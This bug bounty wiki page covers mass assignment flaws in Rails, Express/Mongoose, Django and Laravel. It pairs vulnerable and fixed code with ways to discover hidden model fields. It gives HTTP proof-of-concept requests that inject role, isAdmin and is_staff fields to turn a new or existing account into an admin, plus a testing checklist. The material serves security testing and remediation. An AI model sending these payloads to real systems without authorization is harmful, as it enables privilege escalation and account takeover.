> Source: https://bugbounty.info/Attack-Surface/Web/Business-Logic/Mass-Assignment

# Mass Assignment

Mass assignment is what happens when a framework auto-binds HTTP parameters to model attributes and the developer doesn't explicitly whitelist which attributes are allowed to be set. You register as a normal user and include `role=admin` in the request body. The framework happily assigns it. You're now an admin.

The name comes from Rails, but the pattern exists everywhere  -  Express/Mongoose, Django, Laravel, Spring. The underlying problem is convenience features that bind entire request bodies to data objects without filtering.

## How It Works per Framework

### Ruby on Rails

Classic Rails: `User.new(params[:user])` or `@user.update(params[:user])`  -  anything in the `user` params hash gets assigned.

Modern Rails requires `params.require(:user).permit(:name, :email, :password)`  -  anything not in `permit()` is stripped. The vulnerability exists when `permit!` (permits everything) is used, when the whitelist is too broad, or in old pre-4.0 code.

```http
POST /register HTTP/1.1
Content-Type: application/json
 
{"user": {"name": "Attacker", "email": "x@x.com", "password": "pass", "role": "admin"}}
```

Also test: `is_admin`, `admin`, `verified`, `confirmed`, `plan`, `account_type`.

### Node.js / Express + Mongoose

Mongoose schemas define allowed fields, but `req.body` -> document update without schema filtering is the hole:

```javascript
// Vulnerable
User.findByIdAndUpdate(req.params.id, req.body);
 
// Safe
User.findByIdAndUpdate(req.params.id, {
  name: req.body.name,
  email: req.body.email
});
```

Test by injecting fields that exist on the model but shouldn't be user-settable:

```http
PUT /api/user/profile HTTP/1.1
{"name": "Attacker", "role": "admin", "isVerified": true, "subscription": "enterprise"}
```

### Django

Django REST Framework serializers with `fields = '__all__'` are the culprit:

```python
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = '__all__'  # <-- every model field is writable
```

Test fields that exist on the User model: `is_staff`, `is_superuser`, `groups`, `user_permissions`.

### Laravel / PHP

```php
// Vulnerable
$user->fill($request->all());
 
// Protected
$user->fill($request->only(['name', 'email']));
```

Also check `$fillable` vs `$guarded` model properties  -  `$guarded = []` means nothing is protected.

## Finding Hidden Parameters

The fields you can set aren't always visible in the UI or default request body. Find them by:

### JS Bundle Analysis

Search minified JS for field names that correspond to model attributes:

```bash
# Download and search JS bundles
curl -s https://target.com/app.js | grep -oE '"[a-z_]+":\s*' | sort -u | head -50
# Look for: role, isAdmin, plan, verified, creditBalance, subscriptionTier
```

### API Documentation

If the app has Swagger/OpenAPI docs (`/api/docs`, `/swagger.json`, `/openapi.yaml`), check the schema definitions  -  they list every field on every model.

### Response Analysis

The response to a GET request on your own profile shows you what fields the model has. Any field in the response that you can't set through the UI is a candidate for mass assignment:

```json
GET /api/user/me
{
  "id": 42,
  "name": "Attacker",
  "email": "x@x.com",
  "role": "user",          <- try setting this
  "isVerified": false,     <- try setting this
  "plan": "free",          <- try setting this
  "createdAt": "..."
}
```

### Error Messages

Send unexpected fields and look at validation errors  -  some apps tell you which fields are valid:

```http
POST /register
{"role": "admin"}
-> "role is not a permitted parameter"  <- field exists but is guarded
-> 422 with field errors listing valid fields
```

## PoC: Registration to Admin

```http
POST /api/auth/register HTTP/1.1
Content-Type: application/json
 
{
  "name": "Test",
  "email": "attacker@evil.com",
  "password": "Password1!",
  "role": "admin",
  "isAdmin": true,
  "is_staff": true,
  "account_type": "admin",
  "plan": "enterprise",
  "isVerified": true
}
```

Then log in and check your profile/permissions. Also try via profile update:

```http
PUT /api/user/profile HTTP/1.1
Cookie: session=YOUR_SESSION
 
{"role": "admin"}
```

## Checklist

- Extract all user-related fields from GET /api/user/me response
- Search JS bundles for model field names
- Check API docs for schema definitions
- Test adding `role`, `is_admin`, `isAdmin`, `admin`, `plan`, `verified`, `isVerified` to registration
- Test the same fields on profile update endpoints
- Try nested objects: `{"user": {"role": "admin"}}`
- Check if array fields can be assigned: `{"groups": ["admin"]}`
- Look for `$guarded = []` patterns in any exposed framework config

## Public Reports

- Mass assignment via registration allows setting is_admin flag on new accounts - [HackerOne #1074048](https://hackerone.com/reports/1074048)
- Django REST Framework fields = '**all**' allows setting is_staff on profile update - [HackerOne #1155107](https://hackerone.com/reports/1155107)
- Mongoose mass assignment on user update sets subscription tier to enterprise for free - [HackerOne #1204190](https://hackerone.com/reports/1204190)
- Laravel $fillable misconfiguration allows setting account_type to admin at registration - [HackerOne #1363732](https://hackerone.com/reports/1363732)

## See Also

- [State Machine Bugs](../../../Attack-Surface/Web/Business-Logic/State-Machine)
- [IDOR](../../../Attack-Surface/Web/Authorization/IDOR)
- [JavaScript Analysis](../../../Recon/JavaScript-Analysis)
